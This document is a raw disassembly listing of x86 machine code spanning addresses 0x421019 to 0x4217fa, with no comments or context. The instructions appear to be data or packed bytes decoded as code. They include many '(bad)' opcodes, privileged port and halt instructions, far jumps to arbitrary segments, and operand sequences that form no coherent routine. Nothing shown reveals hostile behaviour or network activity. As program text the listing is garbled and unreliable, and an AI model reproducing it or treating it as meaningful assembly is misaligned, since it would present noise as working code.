  421019:	adc    al,0xca
  42101b:	sar    BYTE PTR [edx+0x7e],0xc1
  42101f:	ss (bad) 
  421021:	xchg   esp,eax
  421022:	inc    edi
  421023:	mov    eax,esp
  421025:	outs   dx,BYTE PTR ds:[esi]
  421026:	pop    ebp
  421027:	and    esi,edx
  421029:	jns    0x421052
  42102b:	je     0x42106f
  42102d:	add    al,0x27
  42102f:	dec    ebx
  421030:	mov    ds:0x63eb28cd,al
  421035:	ror    BYTE PTR [edi],1
  421037:	lock sub bl,al
  42103a:	or     eax,0x4b573dba
  42103f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421040:	popa   
  421041:	cmp    eax,DWORD PTR [edx-0x58c3ebef]
  421047:	pop    edx
  421048:	sar    dl,cl
  42104a:	outs   dx,DWORD PTR ds:[esi]
  42104b:	add    edx,ebx
  42104d:	rol    DWORD PTR [edx+ecx*4-0x2d],cl
  421051:	jmp    0xc0f3:0x9884e57f
  421058:	repnz (bad) 
  42105a:	mov    edx,0x73c3229a
  42105f:	call   0x6ba5412f
  421064:	jle    0x42102a
  421066:	push   0xb53e55d0
  42106b:	(bad)  
  42106c:	daa    
  42106d:	ja     0x421004
  42106f:	popf   
  421070:	xchg   BYTE PTR [eax+0xc],ch
  421073:	fnstsw WORD PTR [eax]
  421075:	(bad)  
  421077:	hlt    
  421078:	dec    edi
  421079:	or     DWORD PTR [ebx+0x57],0xa3ebaae4
  421080:	not    DWORD PTR [edx]
  421082:	pop    esi
  421083:	xor    edi,esi
  421085:	sub    BYTE PTR [esi+0x23],0xff
  421089:	or     ah,BYTE PTR [eax-0x43af871a]
  42108f:	test   BYTE PTR [edi+0x4f],cl
  421092:	mov    DWORD PTR [esi],eax
  421094:	test   al,0xec
  421096:	push   edi
  421097:	outs   dx,DWORD PTR ds:[esi]
  421098:	cli    
  421099:	sbb    al,0x76
  42109b:	inc    ebx
  42109c:	stos   DWORD PTR es:[edi],eax
  42109d:	in     al,0x34
  42109f:	data16 and al,BYTE PTR [ecx]
  4210a2:	sbb    esi,DWORD PTR [ebx]
  4210a4:	push   cs
  4210a5:	xlat   BYTE PTR ds:[ebx]
  4210a6:	push   cs
  4210a7:	test   DWORD PTR [edx+ecx*4+0x30f03a87],ecx
  4210ae:	pop    eax
  4210af:	test   DWORD PTR [esi-0x40],edi
  4210b2:	xor    eax,0xf4e0d557
  4210b7:	mov    edx,0x3750fa74
  4210bc:	stos   BYTE PTR es:[edi],al
  4210bd:	or     eax,0xac0cb7bb
  4210c2:	inc    ebx
  4210c3:	mov    edi,?
  4210c5:	or     ecx,DWORD PTR [ebp+0x2c]
  4210c8:	jecxz  0x4210d2
  4210ca:	push   0xd5b0c045
  4210cf:	inc    ebp
  4210d0:	dec    eax
  4210d1:	push   edx
  4210d2:	jecxz  0x4210f2
  4210d4:	jmp    0xcc51:0xe96450d8
  4210db:	cld    
  4210dc:	jns    0x4210e8
  4210de:	(bad)  
  4210df:	add    DWORD PTR [esi+0x6cf68208],edi
  4210e5:	dec    esi
  4210e6:	xor    esp,ebx
  4210e8:	push   cs
  4210e9:	lock retf 
  4210eb:	add    DWORD PTR [edx-0x47328666],edx
  4210f1:	jmp    0x8d6a:0xb985c5e7
  4210f8:	xchg   ecx,eax
  4210f9:	je     0x4210ee
  4210fb:	dec    eax
  4210fc:	push   edi
  4210fd:	jno    0x4210c2
  4210ff:	rcl    DWORD PTR [ecx*8+0x2e5a399c],0x15
  421107:	xchg   esi,eax
  421108:	repnz in al,dx
  42110a:	sbb    al,al
  42110c:	enter  0x9116,0x3c
  421110:	nop
  421111:	cdq    
  421112:	xor    BYTE PTR [edx+ecx*8],ah
  421115:	sbb    BYTE PTR [edi+0x1c],bh
  421118:	pop    ebp
  421119:	sbb    DWORD PTR [edx+ecx*4+0x1e0935c8],0xffffffa4
  421121:	aad    0xfe
  421123:	mov    ch,0x48
  421125:	adc    edx,DWORD PTR [esi-0x7f]
  421128:	inc    ebx
  421129:	clc    
  42112a:	push   ss
  42112b:	jge    0x42119d
  42112d:	xchg   edx,eax
  42112e:	xchg   ebp,eax
  42112f:	in     eax,dx
  421130:	add    eax,0x50d82e51
  421135:	test   dl,0x9f
  421138:	(bad)  ds:0x2c7fec76
  42113e:	cmp    eax,0x8621052c
  421143:	mov    fs,WORD PTR [edx+0x1bbe3447]
  421149:	lock ror esi,0x3c
  42114d:	in     al,0x89
  42114f:	int3   
  421150:	lea    edi,ds:0x247e67e0
  421156:	jl     0x421148
  421158:	adc    edx,DWORD PTR [edx-0x34]
  42115b:	mov    BYTE PTR [esi],0x93
  42115e:	stos   BYTE PTR es:[edi],al
  42115f:	pusha  
  421160:	cmp    edx,DWORD PTR [edx]
  421162:	retf   0x1bc3
  421165:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421166:	out    dx,eax
  421167:	ins    DWORD PTR es:[edi],dx
  421168:	push   cs
  421169:	lahf   
  42116a:	xor    eax,0xa66c76fe
  42116f:	sbb    ebp,DWORD PTR [eax+ecx*4-0x7d7ab475]
  421176:	arpl   WORD PTR [eax+0x7a8a8f47],cx
  42117c:	jp     0x42117a
  42117e:	sub    al,0x3b
  421180:	pop    edx
  421181:	push   edx
  421182:	aad    0x15
  421184:	pop    ebx
  421185:	lods   al,BYTE PTR ds:[esi]
  421186:	(bad)
  421189:	jg     0x421138
  42118b:	shr    ch,1
  42118d:	dec    edx
  42118e:	imul   BYTE PTR [ebx-0x6e]
  421191:	rcl    DWORD PTR [eax],cl
  421193:	test   bl,dh
  421195:	sub    edx,esp
  421197:	rcr    BYTE PTR [eax],0x2e
  42119a:	mov    ecx,0xc453d899
  42119f:	dec    eax
  4211a0:	add    al,0x5b
  4211a2:	cli    
  4211a3:	adc    eax,0xa40d9c0d
  4211a8:	stc    
  4211a9:	and    cl,bl
  4211ab:	pop    ecx
  4211ac:	mov    ebp,0x950b234f
  4211b1:	xor    dh,ch
  4211b3:	jle    0x421149
  4211b5:	mov    edi,0x70747c4e
  4211ba:	lea    ebx,[ecx+0x1e0ad978]
  4211c0:	fld    QWORD PTR [ebx-0x7c]
  4211c3:	xor    bh,al
  4211c5:	lods   al,BYTE PTR ds:[esi]
  4211c6:	imul   ebp,DWORD PTR [esp+ebx*2],0xf9bbfb9b
  4211cd:	or     eax,0x1b678291
  4211d2:	addr16 xor ebx,edx
  4211d5:	lods   al,BYTE PTR ds:[esi]
  4211d6:	push   ecx
  4211d7:	(bad)  
  4211d8:	mov    edx,0x199f064e
  4211dd:	fidiv  WORD PTR [ebx-0x5eee4ec4]
  4211e3:	pop    edx
  4211e4:	or     ch,dl
  4211e6:	xchg   ebp,eax
  4211e7:	mov    dh,0x28
  4211e9:	xlat   BYTE PTR ds:[ebx]
  4211ea:	leave  
  4211eb:	scas   eax,DWORD PTR es:[edi]
  4211ec:	aam    0x3
  4211ee:	adc    cl,BYTE PTR [eax]
  4211f0:	or     ah,BYTE PTR [ecx+eax*4]
  4211f3:	or     al,BYTE PTR [ebx-0x2a]
  4211f6:	shl    DWORD PTR [ebp+0x26d1b3be],cl
  4211fc:	cmp    bh,BYTE PTR [ecx-0x64]
  4211ff:	push   ebp
  421200:	fstp   TBYTE PTR [esi+0x36]
  421203:	int    0x24
  421205:	or     BYTE PTR [eax+0x15],ah
  421208:	cld    
  421209:	pop    ebx
  42120a:	cmp    eax,0xc9788657
  42120f:	mov    BYTE PTR [ebp-0x79],dh
  421212:	add    BYTE PTR [edi-0x38b9f69],ah
  421218:	jo     0x42125c
  42121a:	fsubr  DWORD PTR [ebp-0x75b76404]
  421220:	dec    esp
  421221:	inc    esp
  421222:	dec    edi
  421223:	cwde   
  421224:	mov    al,ds:0x158469a3
  421229:	or     al,0x14
  42122b:	mov    al,ds:0x274b8c8e
  421230:	jp     0x421291
  421232:	mov    eax,ds:0xa67ac9f
  421237:	ja     0x4211d7
  421239:	rol    BYTE PTR [edi+0xc],cl
  42123c:	fs scas al,BYTE PTR es:[edi]
  42123e:	sub    al,0x6b
  421240:	test   BYTE PTR [eax+edx*8],bh
  421243:	sahf   
  421244:	adc    BYTE PTR [edi],bh
  421246:	xchg   esp,eax
  421247:	idiv   DWORD PTR [ecx+0x9794cf5]
  42124d:	aad    0xab
  42124f:	cmp    BYTE PTR [eax+0x3],bh
  421252:	xor    eax,0xecc5dce8
  421257:	jmp    0x421290
  421259:	stc    
  42125a:	jle    0x4212d9
  42125c:	dec    ebp
  42125d:	adc    al,0x97
  42125f:	in     al,dx
  421260:	and    DWORD PTR [edi+0x54],ecx
  421263:	clc    
  421264:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421265:	inc    edx
  421266:	(bad)  
  421267:	addr16 inc ebp
  421269:	dec    DWORD PTR [edx]
  42126b:	push   ebx
  42126c:	fcomp  st(3)
  42126e:	add    eax,0xd01c624
  421273:	dec    eax
  421274:	xchg   DWORD PTR [edi+0x2b],edx
  421277:	sahf   
  421278:	fild   WORD PTR [ecx]
  42127a:	icebp  
  42127b:	inc    edi
  42127c:	fild   QWORD PTR [esi]
  42127e:	pop    edx
  42127f:	mov    al,ds:0xe37f89
  421284:	in     eax,0xe1
  421286:	stos   BYTE PTR es:[edi],al
  421287:	daa    
  421288:	jl     0x421258
  42128a:	nop
  42128b:	cmp    DWORD PTR [edx+0x44],0x89a83f34
  421292:	mov    dl,0x1f
  421294:	test   DWORD PTR [ecx+0x1],edi
  421297:	mov    al,ds:0x5df7f73e
  42129c:	jbe    0x421300
  42129e:	cld    
  42129f:	adc    BYTE PTR [edi],bh
  4212a1:	cli    
  4212a2:	push   ebx
  4212a3:	mov    al,bh
  4212a5:	or     dl,bh
  4212a7:	push   edi
  4212a8:	cmp    DWORD PTR [edi],0x2e
  4212ab:	push   es
  4212ac:	cmp    dl,cl
  4212ae:	jecxz  0x4212a2
  4212b0:	(bad)  
  4212b1:	jg     0x4212fd
  4212b3:	push   0x87fe4086
  4212b8:	mov    bl,0x38
  4212ba:	in     eax,0x92
  4212bc:	aaa    
  4212bd:	pop    esi
  4212be:	shl    BYTE PTR [eax+esi*2],cl
  4212c1:	(bad)  
  4212c2:	cmp    dl,BYTE PTR [edx]
  4212c4:	out    0xe2,al
  4212c6:	inc    ebp
  4212c7:	je     0x421276
  4212c9:	pop    ss
  4212ca:	xchg   esi,eax
  4212cb:	cmp    eax,0x4b8a4dc7
  4212d0:	xchg   dl,dl
  4212d2:	aad    0x29
  4212d4:	add    BYTE PTR [edi],0xc7
  4212d7:	add    BYTE PTR [ecx-0x61],al
  4212da:	pop    es
  4212db:	sbb    eax,0xc1d2177c
  4212e0:	mov    ebx,0x99847131
  4212e5:	sub    BYTE PTR [edi-0x2d328264],al
  4212eb:	fistp  DWORD PTR [ebx-0x151ecfb4]
  4212f1:	nop
  4212f2:	shr    ch,cl
  4212f4:	sbb    cl,BYTE PTR ds:0x9ff5313
  4212fa:	in     eax,0x51
  4212fc:	sbb    edi,DWORD PTR [edx+0x66]
  4212ff:	cwde   
  421300:	ficomp WORD PTR [esi]
  421302:	popa   
  421303:	xor    edx,esi
  421305:	push   edx
  421306:	into   
  421307:	sbb    esi,DWORD PTR [ecx-0x2e]
  42130a:	or     DWORD PTR [edx-0x7e4b8e2b],edi
  421310:	scas   eax,DWORD PTR es:[edi]
  421311:	xchg   BYTE PTR [bx+si+0x2b],ch
  421315:	sbb    al,0x23
  421317:	dec    eax
  421318:	sub    edi,edx
  42131a:	sub    ebx,edx
  42131c:	xchg   esp,eax
  42131d:	iret   
  42131e:	in     eax,dx
  42131f:	mov    cl,0x7c
  421321:	mov    dh,0xc3
  421323:	add    edi,DWORD PTR [edi-0x6a]
  421326:	out    0x4e,eax
  421328:	pop    edi
  421329:	aaa    
  42132a:	mov    al,ds:0x23179c64
  42132f:	sub    eax,0x5abe6787
  421334:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421335:	loop   0x4213a3
  421337:	xchg   bh,dl
  421339:	and    eax,0x63c8e94a
  42133e:	push   cs
  42133f:	push   es
  421340:	sbb    eax,0xd0955df3
  421345:	aad    0x6e
  421347:	aad    0x5f
  421349:	xchg   ebp,eax
  42134a:	sub    DWORD PTR [eax-0x57],0x93908bd1
  421351:	js     0x421369
  421353:	sub    eax,0xf5cb7e7c
  421358:	sar    DWORD PTR [ecx+0x29],0xd4
  42135c:	jmp    0xdd73:0xd7959805
  421363:	or     al,0xa3
  421365:	out    dx,al
  421366:	xchg   BYTE PTR [ecx+0x38],dh
  421369:	sub    bl,BYTE PTR [eax+0x74]
  42136c:	(bad)  
  42136d:	fucomi st,st(5)
  42136f:	inc    esi
  421370:	popa   
  421371:	outs   dx,BYTE PTR ds:[esi]
  421372:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421373:	sbb    al,0x53
  421375:	xchg   esp,eax
  421376:	aad    0x13
  421378:	nop
  421379:	or     eax,0xed509e16
  42137e:	inc    esp
  42137f:	sub    DWORD PTR [esi+ebx*4+0x76],esi
  421383:	pushf  
  421384:	mov    edx,DWORD PTR [ebp+0x3e]
  421387:	ret    
  421388:	jne    0x421329
  42138a:	inc    esp
  42138b:	pop    ss
  42138c:	xchg   BYTE PTR [ecx-0x66],dl
  42138f:	inc    esp
  421390:	inc    edx
  421391:	sbb    DWORD PTR [ebx],eax
  421393:	retf   0xf407
  421396:	cmp    DWORD PTR [esi-0x54],edx
  421399:	aam    0x34
  42139b:	outs   dx,BYTE PTR ds:[esi]
  42139c:	jg     0x4213c0
  42139e:	jns    0x42138c
  4213a0:	inc    edx
  4213a1:	pushf  
  4213a2:	into   
  4213a3:	mov    BYTE PTR [edx+0x6b],0xed
  4213a7:	pop    ecx
  4213a8:	mov    dh,0x8d
  4213aa:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4213ab:	addr16 sub dl,cl
  4213ae:	test   DWORD PTR [eax-0x66bf4f45],esp
  4213b4:	in     al,0x56
  4213b6:	mov    esp,0x76a03ff5
  4213bb:	mov    dl,0xd6
  4213bd:	lahf   
  4213be:	mov    ss,WORD PTR [ecx+eiz*8-0x57]
  4213c2:	push   edi
  4213c3:	cld    
  4213c4:	inc    ebp
  4213c5:	mov    ecx,0x2a3ea2df
  4213ca:	inc    eax
  4213cb:	adc    dl,BYTE PTR ds:0xed607a39
  4213d1:	or     ebx,esp
  4213d3:	jb     0x4213bd
  4213d5:	mov    eax,ds:0xbe09f4d9
  4213da:	cmc    
  4213db:	xchg   edx,eax
  4213dc:	jne    0x42141f
  4213de:	push   edx
  4213df:	mov    eax,0xcbbaeb5e
  4213e4:	dec    edx
  4213e5:	jne    0x42143b
  4213e7:	das    
  4213e8:	mov    ?,WORD PTR fs:[edi-0x2c]
  4213ec:	or     esi,esp
  4213ee:	call   0xd67dd089
  4213f3:	in     eax,0xb3
  4213f5:	xor    BYTE PTR [ecx-0x2a5e56ea],bl
  4213fb:	xor    ah,BYTE PTR [edi-0x4]
  4213fe:	jb     0x421412
  421400:	(bad)  
  421401:	mov    al,ds:0x1220172a
  421406:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421407:	aaa    
  421408:	mov    esi,ebx
  42140a:	cli    
  42140b:	adc    BYTE PTR [esp+edi*2],bl
  42140e:	sub    eax,0xea2e25a6
  421413:	push   esp
  421414:	ret    
  421415:	xchg   ebx,eax
  421416:	retf   0x18c
  421419:	adc    edi,ebp
  42141b:	lods   al,BYTE PTR ds:[esi]
  42141c:	xor    BYTE PTR [esi-0x7b794262],bl
  421422:	mov    cl,0x29
  421424:	int3   
  421425:	int3   
  421426:	imul   edx,DWORD PTR [ebx],0x74
  421429:	dec    eax
  42142a:	adc    ebp,DWORD PTR [edx+eax*8-0x11eeb3b7]
  421431:	stos   DWORD PTR es:[edi],eax
  421432:	stos   DWORD PTR es:[edi],eax
  421433:	out    0x35,eax
  421435:	or     dl,BYTE PTR [eax-0x74]
  421438:	imul   ebx,DWORD PTR [eax+0x430fe891],0xd5fbaeab
  421442:	sub    eax,DWORD PTR [edx+edx*2-0x32]
  421446:	cmp    al,0xc4
  421448:	test   al,0x30
  42144a:	ins    DWORD PTR es:[edi],dx
  42144b:	out    dx,eax
  42144c:	ds push 0x6
  42144f:	mov    cl,0x5
  421451:	xor    BYTE PTR [ebx+0xcb71fb2],cl
  421457:	(bad)  
  421458:	jg     0x4213e0
  42145a:	into   
  42145b:	in     al,0x35
  42145d:	enter  0x19d,0x2c
  421461:	push   edi
  421462:	bound  esi,QWORD PTR [ecx+esi*4-0x2aa1e356]
  421469:	icebp  
  42146a:	add    DWORD PTR [ecx+ebx*1],ecx
  42146d:	xchg   edi,eax
  42146e:	add    eax,0x3e1ed43e
  421473:	cld    
  421474:	mov    WORD PTR [edx],ds
  421476:	xchg   ebp,eax
  421477:	repnz rcl dx,0x7
  42147c:	mov    eax,ds:0x7abb6993
  421481:	popa   
  421482:	add    al,0x42
  421484:	sbb    bh,BYTE PTR [ecx+0x7e0e0992]
  42148a:	cli    
  42148b:	aad    0xda
  42148d:	jp     0x4214ea
  42148f:	sbb    bl,BYTE PTR [ebx+0x3f38be5]
  421495:	fidivr DWORD PTR [esi]
  421497:	or     eax,0x21b1f9e4
  42149d:	mov    al,ds:0x574f26ad
  4214a2:	mov    edi,0x18bb0bde
  4214a7:	retf   
  4214a8:	in     al,0x62
  4214aa:	xchg   DWORD PTR [eax+0x64],esi
  4214ad:	pop    eax
  4214ae:	pop    ebp
  4214af:	scas   al,BYTE PTR es:[edi]
  4214b0:	mov    eax,0x409ff645
  4214b5:	sub    eax,0x1f8289b1
  4214ba:	repz mov dh,0x51
  4214bd:	retf   0x3955
  4214c0:	mov    esp,0xb32695ec
  4214c5:	pop    esi
  4214c6:	push   ds
  4214c7:	sbb    al,0xe7
  4214c9:	xchg   esi,eax
  4214ca:	jne    0x421460
  4214cc:	rcr    BYTE PTR [ebx+eiz*1+0x27e5a435],1
  4214d3:	adc    edi,ecx
  4214d5:	in     eax,0xbe
  4214d7:	dec    edi
  4214d8:	in     al,dx
  4214d9:	dec    esp
  4214da:	push   cs
  4214db:	sub    ch,BYTE PTR [esi]
  4214dd:	mov    ?,esi
  4214df:	int    0xff
  4214e1:	test   BYTE PTR [eax],cl
  4214e3:	nop
  4214e4:	jp     0x4214f2
  4214e6:	jge    0x4214ff
  4214e8:	test   BYTE PTR [esi],cl
  4214ea:	call   0x758f:0xfa4acde5
  4214f1:	xor    ebp,DWORD PTR [esi+0x24]
  4214f4:	dec    eax
  4214f5:	push   esi
  4214f6:	out    0x61,al
  4214f8:	push   edi
  4214f9:	mov    ch,0x9f
  4214fc:	repnz mov ah,0xcd
  4214ff:	jno    0x4214d9
  421501:	add    DWORD PTR [esi-0x16],ecx
  421504:	iret   
  421505:	mov    WORD PTR [esi+eax*4+0x70],ds
  421509:	test   BYTE PTR [eax+ebx*8+0x78cf7a94],bh
  421510:	cmp    esi,DWORD PTR [esi-0x53]
  421513:	mov    ecx,0x679ff924
  421518:	push   ebx
  421519:	lods   al,BYTE PTR ds:[esi]
  42151a:	jb     0x4214e0
  42151c:	sub    edx,0xffffff99
  42151f:	add    BYTE PTR [ebx],ch
  421521:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421522:	sbb    edx,0x27c2b507
  421528:	out    dx,al
  421529:	xor    eax,0x69e49cfb
  42152e:	add    al,0x35
  421530:	ror    BYTE PTR [esi-0x1f],cl
  421533:	push   es
  421534:	pop    eax
  421535:	pop    esi
  421536:	add    dh,BYTE PTR [edx+0x1b4b018a]
  42153c:	or     ebp,eax
  42153e:	outs   dx,DWORD PTR ds:[esi]
  42153f:	mov    cl,0xa5
  421541:	jle    0x421502
  421543:	jle    0x42158b
  421545:	test   al,0x1d
  421547:	mov    ecx,0xe8018d00
  42154c:	leave  
  42154d:	or     ebx,edi
  42154f:	xor    si,cx
  421552:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421553:	or     DWORD PTR [edx+0x1d],edx
  421556:	test   BYTE PTR ds:0x950d14e2,ch
  42155c:	mov    al,ds:0x981a559f
  421561:	pop    ss
  421562:	in     eax,0x7a
  421564:	call   0xdf39:0x39a9bfe
  42156b:	in     eax,dx
  42156c:	inc    esp
  42156d:	jl     0x42157d
  42156f:	pop    es
  421570:	das    
  421571:	in     al,dx
  421572:	mov    WORD PTR [ecx+0x63],?
  421575:	jno    0x42156f
  421577:	inc    ebx
  421578:	mov    ah,0x1c
  42157a:	fst    QWORD PTR [edx]
  42157c:	push   0x14
  42157e:	fisub  DWORD PTR [edi+0x56]
  421581:	sbb    DWORD PTR [edx-0x5],eax
  421584:	inc    esp
  421585:	inc    ebp
  421586:	(bad)  
  421587:	and    ebx,ebx
  421589:	out    0xb,eax
  42158b:	repnz test BYTE PTR [eax-0x3d],ah
  42158f:	inc    ebx
  421590:	and    DWORD PTR [esp+ecx*8-0x592ffb8f],ecx
  421597:	aas    
  421598:	xor    DWORD PTR [ecx],eax
  42159a:	in     al,dx
  42159b:	out    dx,eax
  42159c:	and    esp,DWORD PTR [esi+0xc]
  42159f:	in     al,0xfc
  4215a1:	mov    edi,DWORD PTR [ebp-0x470fa61a]
  4215a7:	xchg   edi,eax
  4215a8:	in     eax,dx
  4215a9:	fsub   st,st(4)
  4215ab:	imul   edi,ebp,0xffffff8a
  4215ae:	xchg   ebx,eax
  4215af:	cmp    al,0x27
  4215b1:	sahf   
  4215b2:	in     eax,dx
  4215b3:	test   BYTE PTR [edi],dh
  4215b5:	out    0xef,al
  4215b7:	mov    esp,0xc4586593
  4215bc:	mov    al,ds:0xa8d2d0bd
  4215c1:	push   0x474f5be4
  4215c6:	adc    DWORD PTR ds:0xc7594a3c,edx
  4215cc:	cmp    edx,DWORD PTR [ebp-0x80]
  4215cf:	and    dl,BYTE PTR [ebx+edi*8-0x39c429b9]
  4215d6:	inc    esp
  4215d7:	shr    BYTE PTR [ebp-0x783b8aa4],0x5c
  4215de:	cmp    al,0x77
  4215e0:	push   eax
  4215e1:	mov    ds:0xa12fe23b,eax
  4215e6:	test   dh,bl
  4215e8:	and    al,0x1a
  4215ea:	mov    bh,0x64
  4215ec:	xor    al,0xa5
  4215ee:	ficom  DWORD PTR [eax+edi*4]
  4215f1:	sub    BYTE PTR [eax+ecx*8],cl
  4215f4:	inc    ebp
  4215f5:	inc    DWORD PTR [esi+eax*2-0x1f]
  4215f9:	addr16 clc 
  4215fb:	inc    esi
  4215fc:	dec    esi
  4215fd:	jno    0x421626
  4215ff:	add    al,0x5d
  421601:	pop    edi
  421602:	btc    ebx,edi
  421605:	je     0x42163c
  421607:	(bad)  
  421609:	or     eax,0x4fe4f952
  42160e:	jl     0x421667
  421610:	pop    ebp
  421611:	xlat   BYTE PTR ds:[ebx]
  421612:	mov    ebp,0xab7f6ace
  421617:	sbb    BYTE PTR [esi+0x7d8436e],dl
  42161d:	mov    esp,?
  42161f:	shl    DWORD PTR [ebp+0x40],0xcf
  421623:	jmp    0x56b9fa63
  421628:	and    al,0xe7
  42162a:	push   ecx
  42162b:	inc    esp
  42162c:	scas   al,BYTE PTR es:[edi]
  42162d:	fisttp WORD PTR ds:[eax]
  421630:	inc    edx
  421631:	daa    
  421632:	mov    al,ds:0xd4e6ab91
  421637:	dec    ecx
  421638:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421639:	test   BYTE PTR [ecx+0x4b],ah
  42163c:	test   al,0xc0
  42163e:	pop    ecx
  42163f:	adc    eax,0x9ac806b8
  421644:	sub    edi,eax
  421646:	dec    edx
  421647:	ja     0x42165e
  421649:	retf   0x5d0a
  42164c:	rcl    DWORD PTR [ebx+edx*2+0x59c3171f],0x49
  421654:	or     al,0x23
  421656:	repz not BYTE PTR [ebx+0x697bac25]
  42165d:	sahf   
  42165e:	and    al,0x68
  421660:	(bad)  
  421662:	add    eax,0x134616c6
  421667:	mov    eax,0x9b3d1b4
  42166c:	loopne 0x42165b
  42166e:	mov    bh,0x72
  421670:	ins    DWORD PTR es:[edi],dx
  421671:	in     al,dx
  421672:	test   eax,0xec3a04a8
  421677:	sbb    DWORD PTR [edi+0x35],edx
  42167a:	js     0x421623
  42167c:	push   ecx
  42167d:	xchg   edx,eax
  42167e:	mov    DWORD PTR [eax+0x7b],ebx
  421681:	cwde   
  421682:	retf   0x2445
  421685:	xchg   ecx,eax
  421686:	neg    BYTE PTR [esi-0x64672ed8]
  42168c:	cmp    al,0x80
  42168e:	sub    al,0x6b
  421690:	mov    al,0xf5
  421692:	enter  0x2432,0x63
  421696:	scas   al,BYTE PTR es:[edi]
  421697:	or     bh,BYTE PTR [esi+0x5a]
  42169a:	mov    ah,0x75
  42169c:	mov    al,ds:0x3fe783c2
  4216a1:	leave  
  4216a2:	cmp    bh,BYTE PTR [ecx-0x7f]
  4216a5:	int    0xac
  4216a7:	mov    ds:0xf6707482,al
  4216ac:	dec    edx
  4216ad:	lods   al,BYTE PTR ds:[esi]
  4216ae:	jno    0x4216c6
  4216b0:	lea    eax,[eax]
  4216b2:	sub    eax,0x8e62646f
  4216b7:	icebp  
  4216b8:	lahf   
  4216b9:	push   ss
  4216ba:	mov    ecx,0xb894b7f2
  4216bf:	test   eax,0xa266131b
  4216c4:	les    ebp,FWORD PTR [ebx]
  4216c6:	clc    
  4216c7:	push   cs
  4216c8:	xchg   DWORD PTR [ecx+esi*2-0x77],esi
  4216cc:	ss jl  0x4216d3
  4216cf:	mov    ebp,0x8d70e177
  4216d4:	pop    edx
  4216d5:	sbb    edi,DWORD PTR [eax-0x656fe8b5]
  4216db:	clc    
  4216dc:	int3   
  4216dd:	idiv   ecx
  4216df:	stc    
  4216e0:	ins    DWORD PTR es:[edi],dx
  4216e1:	scas   eax,DWORD PTR es:[edi]
  4216e2:	out    dx,eax
  4216e3:	lds    ecx,FWORD PTR [edi-0x49c80811]
  4216e9:	xchg   esp,eax
  4216ea:	sbb    esp,0xc8f43f2d
  4216f0:	add    ch,0x13
  4216f3:	sub    ecx,DWORD PTR ds:0xe3e9218
  4216f9:	pop    edi
  4216fa:	cmp    BYTE PTR [ecx-0x3083be51],0xf6
  421701:	xor    bh,BYTE PTR [esi+0x7227ca7d]
  421707:	lock dec esp
  421709:	test   DWORD PTR [eax],esi
  42170b:	dec    esp
  42170c:	ss mov ch,0x7d
  42170f:	ficom  WORD PTR ds:0xa27f8fbe
  421715:	mov    edi,edx
  421717:	mov    eax,ds:0xee5c601d
  42171c:	jge    0x421732
  42171e:	jmp    0x9bb12bfc
  421723:	xchg   ebp,eax
  421724:	jmp    0x1179:0xbfd32847
  42172b:	fild   QWORD PTR [ecx+ecx*4]
  42172e:	call   0x736eff35
  421733:	cmp    edx,DWORD PTR [esi]
  421735:	xor    al,0xe6
  421737:	mov    ebx,DWORD PTR [ebp+0x6b]
  42173a:	sbb    BYTE PTR [ebp-0x7d],ch
  42173d:	and    al,0xd0
  42173f:	test   DWORD PTR [edx],ebp
  421741:	imul   edi,DWORD PTR [esi],0x4c379239
  421747:	or     ch,BYTE PTR [eax+0x29fc2631]
  42174d:	dec    esi
  42174e:	cdq    
  42174f:	call   0xa10a:0x3b94e9e1
  421756:	pop    ebx
  421757:	das    
  421758:	fs je  0x42177c
  42175b:	mov    ds:0xc077aef3,eax
  421760:	jp     0x4216ee
  421762:	repz loop 0x4216e8
  421765:	jae    0x42170c
  421767:	fucompp 
  421769:	nop
  42176a:	mov    ds:0x8af1828,eax
  42176f:	(bad)  
  421771:	xor    al,0x5a
  421773:	cmc    
  421774:	sub    DWORD PTR [esi+0x3ce2cac3],ebx
  42177a:	js     0x421781
  42177c:	push   cs
  42177d:	sub    BYTE PTR [ebx+0x1b],cl
  421780:	xchg   edx,eax
  421781:	sub    BYTE PTR [edx],dh
  421783:	jbe    0x421756
  421785:	jle    0x421769
  421787:	and    esp,0x57c38b87
  42178d:	jns    0x421750
  42178f:	adc    ah,BYTE PTR [eax-0x7f]
  421792:	ficomp WORD PTR [esi-0x33]
  421795:	push   0xffffffb5
  421797:	dec    esp
  421798:	xor    DWORD PTR [esi-0xb],eax
  42179b:	jp     0x42176b
  42179d:	out    0xff,eax
  42179f:	push   ebp
  4217a0:	dec    ebx
  4217a1:	add    BYTE PTR [ebp+0x48f93cc5],dl
  4217a7:	or     DWORD PTR ds:[ebp+0x72e1341c],ebx
  4217ae:	daa    
  4217af:	pusha  
  4217b0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4217b1:	jae    0x42174d
  4217b3:	and    dh,bl
  4217b5:	inc    esp
  4217b6:	push   ebp
  4217b7:	and    al,0xb0
  4217b9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4217ba:	add    dl,BYTE PTR [ecx]
  4217bc:	pushf  
  4217bd:	ja     0x421741
  4217bf:	repnz mov bh,0x1
  4217c2:	inc    esp
  4217c3:	inc    eax
  4217c4:	sub    DWORD PTR [edi],0x919a6090
  4217ca:	retf   
  4217cb:	jo     0x421782
  4217cd:	adc    DWORD PTR [ecx],edi
  4217cf:	dec    esi
  4217d0:	lods   eax,DWORD PTR ds:[esi]
  4217d1:	fcom   QWORD PTR [edx]
  4217d3:	std    
  4217d4:	pop    ebp
  4217d5:	pop    ecx
  4217d6:	and    edi,edi
  4217d8:	cmp    eax,0xcc18aea1
  4217dd:	push   0x1965cde8
  4217e2:	push   0x4df115ee
  4217e7:	out    dx,eax
  4217e8:	arpl   WORD PTR [ebp+0x30a21488],bx
  4217ee:	stos   DWORD PTR es:[edi],eax
  4217ef:	dec    ebx
  4217f0:	and    DWORD PTR [ecx],esp
  4217f2:	ins    BYTE PTR es:[edi],dx
  4217f3:	popa   
  4217f4:	fs push edx
  4217f6:	cmp    ah,0x4d
  4217f9:	(bad)  
  4217fa:	push   esp
